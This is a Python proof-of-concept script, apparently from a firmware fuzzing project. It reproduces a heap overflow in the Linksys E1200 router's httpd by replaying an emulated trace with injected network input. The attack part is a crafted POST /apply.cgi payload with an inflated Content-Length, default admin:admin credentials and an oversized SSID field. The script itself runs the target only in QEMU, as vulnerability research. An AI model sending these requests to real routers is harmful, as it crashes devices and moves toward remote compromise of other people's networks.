#!/usr/bin/env python3
"""
poc_e1200_heap.py — Multi-request PoC for NB-E1200-01 heap overflow

Crash: SIGSEGV in realloc() when httpd processes POST /apply.cgi with
inflated Content-Length. Requires multiple requests to the SAME httpd
process to corrupt heap state.

Two confirmed crashes:
  7ed84369 — pc=0x2b4980c8 (realloc+0x218), 2876 hits
  a5b07455 — pc=0x2b498000 (realloc+0x150), 81 hits

Key mutations (all network-FD):
  http_extend at idx=106/109: inflate retval by +0x400 (1024 bytes)
  http_request at idx=106/109: inject POST /apply.cgi body

Usage:
  cd rr_fuzzing/fuzzing
  python3 ../tests/scripts/fuzzing/poc_e1200_heap.py [--max-rounds N] [--gdb]

GDB (with --gdb):
  gdb-multiarch tests/verified_targets/Linksys_E1200/rootfs/usr/sbin/httpd
  (gdb) set architecture mips
  (gdb) target remote :9998
  (gdb) continue
"""
import sys, time, argparse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / 'fuzzing'))

from conductor.qemu_executor import QEMUExecutor
from conductor.conductor_types import FuzzInstruction

ROOTFS     = str(ROOT / 'tests/verified_targets/Linksys_E1200/rootfs')
BUILD      = str(ROOT / '../../build')
BINARY     = f'{ROOTFS}/usr/sbin/httpd'
TRACE      = str(ROOT / 'tests/seeds/Linksys_E1200_post.trace')
FORK_POINT = 104
GDB_PORT   = 9998

# Mutations for confirmed crash 7ed84369 (realloc+0x218)
# Re-recorded trace (2026-04-10): idx=136=read(256B headers), idx=138=read(116B body)
# Both reads must be mutated to inject consistent oversized payload.
MUTATIONS_7ED84369 = [
    # Inflate header read + inject new headers claiming Content-Length: 9999
    FuzzInstruction(syscall_index=136, cmd=8,  arg_index=1,
                    data=b'\x00\x04\x00\x00', offset=0, size=4,
                    mutation_type='http_extend'),
    FuzzInstruction(syscall_index=136, cmd=5,  arg_index=1,
                    data=(b'POST /apply.cgi HTTP/1.1\r\n'
                          b'Host: 127.0.0.1\r\n'
                          b'Authorization: Basic YWRtaW46YWRtaW4=\r\n'
                          b'Content-Type: application/x-www-form-urlencoded\r\n'
                          b'Content-Length: 9999\r\n\r\n'),
                    offset=0, size=96, mutation_type='http_request'),
    # Inflate body read + inject oversized POST body → realloc overflow
    FuzzInstruction(syscall_index=138, cmd=8,  arg_index=1,
                    data=b'\x00\x04\x00\x00', offset=0, size=4,
                    mutation_type='http_extend'),
    FuzzInstruction(syscall_index=138, cmd=5,  arg_index=1,
                    data=(b'submit_button=Wireless_Basic&'
                          b'action=Apply&wl_ssid=' + b'A' * 87),
                    offset=0, size=116, mutation_type='http_request'),
]

# Mutations from a5b07455 (realloc+0x150) — net-only minimal trigger
# Both HTTP reads (idx=136 headers, idx=138 body) needed for consistent overflow.
MUTATIONS_A5B07455_NET = [
    FuzzInstruction(syscall_index=136, cmd=8,  arg_index=1,
                    data=b'\x00\x04\x00\x00', offset=0, size=4,
                    mutation_type='http_extend'),
    FuzzInstruction(syscall_index=136, cmd=5,  arg_index=1,
                    data=(b'POST /apply.cgi HTTP/1.1\r\n'
                          b'Content-Length: 9999\r\n\r\n'
                          b'submit_button=Wireless_Basic&'
                          b'action=Apply&wl_ssid='),
                    offset=0, size=67, mutation_type='http_request'),
    FuzzInstruction(syscall_index=138, cmd=8,  arg_index=1,
                    data=b'\x00\x04\x00\x00', offset=0, size=4,
                    mutation_type='http_extend'),
    FuzzInstruction(syscall_index=138, cmd=5,  arg_index=1,
                    data=(b'submit_button=Wireless_Basic&'
                          b'action=Apply&wl_ssid=' + b'A' * 87),
                    offset=0, size=116, mutation_type='http_request'),
]

VARIANT_SETS = {
    '7ed84369': MUTATIONS_7ED84369,
    'a5b07455_net': MUTATIONS_A5B07455_NET,
}


def run_poc(max_rounds: int, gdb_mode: bool, target_hash: str):
    mutations = VARIANT_SETS[target_hash]
    extra_args = ['-g', str(GDB_PORT)] if gdb_mode else []

    if gdb_mode:
        print(f'\nConnect GDB:')
        print(f'  gdb-multiarch {BINARY}')
        print(f'  (gdb) set architecture mips')
        print(f'  (gdb) target remote :{GDB_PORT}')
        print(f'  (gdb) continue\n')

    executor = QEMUExecutor(
        qemu_path=f'{BUILD}/qemu-mipsel',
        target_binary=BINARY,
        ld_prefix=ROOTFS,
        timeout=15.0,
        extra_qemu_args=extra_args,
    )

    print(f'[*] Target  : {BINARY}')
    print(f'[*] Trace   : {TRACE}')
    print(f'[*] Variant : {target_hash} ({len(mutations)} mutations)')
    print(f'[*] Rounds  : up to {max_rounds}')
    print()

    found = False
    for rnd in range(1, max_rounds + 1):
        results = executor.execute_fork(
            trace_file=TRACE,
            fork_point=FORK_POINT,
            mutation_variants=[mutations],
            depth=0,
            iteration_id=rnd,
        )

        if not results:
            print(f'  round {rnd:4d}: no result')
            continue

        r = results[0]
        crashed = getattr(r, 'crashed', False)
        sig     = getattr(r, 'signal_number', None)
        pc      = hex(getattr(r, 'pc', 0) or 0)
        status  = getattr(r, 'status_name', 'unknown')

        if crashed:
            print(f'  round {rnd:4d}: *** CRASH ***  pc={pc}  signal={sig}')
            found = True
            break
        else:
            if rnd % 50 == 0:
                print(f'  round {rnd:4d}: {status}')

    executor.stop_persistent_qemu()

    print()
    if found:
        print(f'★ NB-E1200-01 HEAP OVERFLOW CONFIRMED')
        print(f'  pc={pc}  signal={sig}')
        print(f'  All mutations are network-FD only → NETWORK-EXPLOITABLE')
    else:
        print(f'✗ Not reproduced in {max_rounds} rounds')
        print(f'  Note: heap corruption may require more rounds or different heap state.')
    return found


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--max-rounds', type=int, default=200)
    ap.add_argument('--gdb',        action='store_true')
    ap.add_argument('--variant',    default='7ed84369',
                    choices=list(VARIANT_SETS.keys()))
    args = ap.parse_args()

    run_poc(args.max_rounds, args.gdb, args.variant)


if __name__ == '__main__':
    main()
